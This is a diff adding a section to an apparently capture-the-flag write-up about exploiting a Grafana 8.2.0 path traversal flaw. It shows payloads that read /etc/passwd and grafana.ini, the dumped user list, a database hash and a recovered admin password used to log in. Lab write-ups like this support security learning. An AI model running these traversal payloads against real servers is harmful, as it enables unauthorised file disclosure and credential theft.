@@ -230,5 +230,109 @@ Use the `developer` account to SSH, DevOps will give you the password.
 
 This welcome post provides valuable information about the purpose and setup of the development server. I also attempted to connect to the server using the developer account by using common passwords, but without success.
 
-So i decided to move on to the next port: `3000`
+So i decided to move on to the next port: `3000`.
 
+## LFI in grafana panel
+
+As you probably know, we have enumerated this port before and it turned out to be a `grafana` server let's dig deeper.
+
+The first thing to do is get the version of it:
+
+`grafana v8.2.0 (d7f71e9eae)`
+
+now, let's search for known exploits on the internet.
+
+Bingo!
+
+https://www.exploit-db.com/exploits/50581 
+
+when you see the exploit-db website popping up as first result is always a big yahoooo!
+
+At first, i tried using the allegated python script, but since it didn't work i tried to do it manually with burpsuite, and after a little bit of debugging it worked!
+
+`/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd`
+
+And there it is! We were able to successfully retrieve the `/etc/passwd` file. This file contains a list of all the users on the system and is an important source of information.
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+developer:x:1000:1000:developer:/home/developer:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+grafana:x:113:118::/usr/share/grafana:/bin/false
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+consul:x:997:997::/home/consul:/bin/false
+```
+
+okay from here we can see the users that can access bash: the `developer` user and `root`
+
+and intrestingly there is a consul service account that has a home
+
+`consul:x:997:997::/home/consul:/bin/false`
+
+we will come back on that later... for now let's concentrate in this lfi.
+
+The first thing I tried after dumping users is getting the database of grafana contained in the
+
+`/var/lib/grafana/grafana.db` folder.
+
+I actually found some hashes that didn't crack sadly
+
+`dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab069`
+
+So why not try to get the configuration file for grafana? Let's see...
+
+By simply searching on interet for the file location 
+(`/public/plugins/table/../../../../../../../../../../../../../../etc/grafana/grafana.ini`) we can access the configuration file and potentially find the password.
+
+And there it is!
+
+```ini
+
+#################################### Security ####################################
+[security]
+# disable creation of admin user on first start of grafana
+;disable_initial_admin_creation = false
+
+# default admin user, created on startup
+admin_user = admin
+
+# default admin password, can be changed before first start of grafana,  or in profile settings
+admin_password = messageInABottle685427
+```
+
+i used these credentials to access the panel and it worked!
+
+## grafana panel and mysql access
+
+at first glance, i tought i had to exfiltrate some files trough the grafana panel but after some time i came to the conclusion that i must be missing something
